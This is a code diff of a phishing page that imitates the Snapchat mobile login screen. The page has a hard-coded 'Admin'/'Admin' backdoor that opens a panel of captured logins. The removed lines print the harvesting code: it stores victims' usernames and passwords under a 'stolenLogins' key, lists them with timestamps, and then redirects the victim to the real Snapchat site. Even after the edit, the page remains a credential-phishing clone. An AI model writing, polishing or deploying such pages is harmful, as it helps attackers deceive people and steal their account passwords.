@@ -53,7 +53,7 @@
 
     #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; }
 
-    h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; }
+    h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; text-align: center; }
 
     form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 
@@ -76,15 +76,21 @@
     }
     #adminSection { display: none; }
     #adminSection.active { display: block; }
+
+    /* Skinnier back arrow */
+    .back-arrow i { font-size: 1rem; }
   </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
   <div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
-    <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-xl leading-none font-medium">
+    <!-- Back Arrow -->
+    <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
       <i class="fas fa-chevron-left"></i>
     </button>
-    <img src="https://static.snapchat.com/app/direct/snapchat-logo.png" alt="Snapchat Logo" class="w-16 h-16 mx-auto mt-8">
-    <h1 class="mt-4 mb-8 text-center text-black font-medium font-sans">Log In to Snapchat</h1>
+
+    <!-- Page title -->
+    <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
+
     <form id="loginForm" class="flex flex-col space-y-6">
       <div class="flex flex-col input-container">
         <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME OR EMAIL</label>
@@ -105,6 +111,7 @@
       <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     </form>
   </div>
+
   <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>
 
   <div id="adminSection" class="p-6 max-w-3xl mx-auto">
@@ -135,8 +142,6 @@
       const loginBtn = document.getElementById("loginBtn")
       const errorMsg = document.getElementById("errorMsg")
       const forgotPassword = document.getElementById("forgotPassword")
-      const loginSection = document.getElementById("loginSection")
-      const adminSection = document.getElementById("adminSection")
       const loginList = document.getElementById("loginList")
       const totalLogins = document.getElementById("totalLogins")
       const lastLogin = document.getElementById("lastLogin")
@@ -156,23 +161,6 @@
       usernameInput.addEventListener("input", checkInputs)
       passwordInput.addEventListener("input", checkInputs)
 
-      function updateAdminDisplay() {
-        let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-        loginList.innerHTML = ""
-        if (storedData.length === 0) {
-          loginList.innerHTML = '<pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet</pre>'
-        } else {
-          storedData.forEach((entry, index) => {
-            const div = document.createElement("div")
-            div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center"
-            div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`
-            loginList.appendChild(div)
-          })
-        }
-        totalLogins.textContent = storedData.length
-        lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length - 1].timestamp : "N/A"
-      }
-
       loginBtn.addEventListener("click", async function() {
         if(usernameInput.value.trim() && passwordInput.value.trim()) {
           if(usernameInput.value === "Admin" && passwordInput.value === "Admin") {
@@ -183,19 +171,6 @@
             loginBtn.classList.remove("bg-[#00b0ff]")
             loginBtn.classList.add("bg-gray-400")
             loginBtn.disabled = true
-
-            let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-            const newEntry = {
-              username: usernameInput.value,
-              password: passwordInput.value,
-              timestamp: new Date().toLocaleString()
-            }
-            storedData.push(newEntry)
-            localStorage.setItem("stolenLogins", JSON.stringify(storedData))
-            updateAdminDisplay()
-            setTimeout(() => {
-              window.location.href = "https://accounts.snapchat.com"
-            }, 1000)
           }
         }
       })
@@ -208,13 +183,6 @@
           passwordInput.type = "password"
           document.getElementById("eyeIcon").classList.replace("fa-eye", "fa-eye-slash")
         }
-      }
-
-      window.removeLogin = function(index) {
-        let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-        storedData.splice(index, 1)
-        localStorage.setItem("stolenLogins", JSON.stringify(storedData))
-        updateAdminDisplay()
       }
 
       function moveAboveKeyboard() {
@@ -239,9 +207,16 @@
       passwordInput.addEventListener("keydown", function(e) {
         if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click()
       })
-
-      updateAdminDisplay()
     })
+
+    // Back arrow functionality
+    function goBack() {
+      if (window.history.length > 1) {
+        window.history.back();
+      } else {
+        window.location.reload();
+      }
+    }
   </script>
 </body>
 </html>
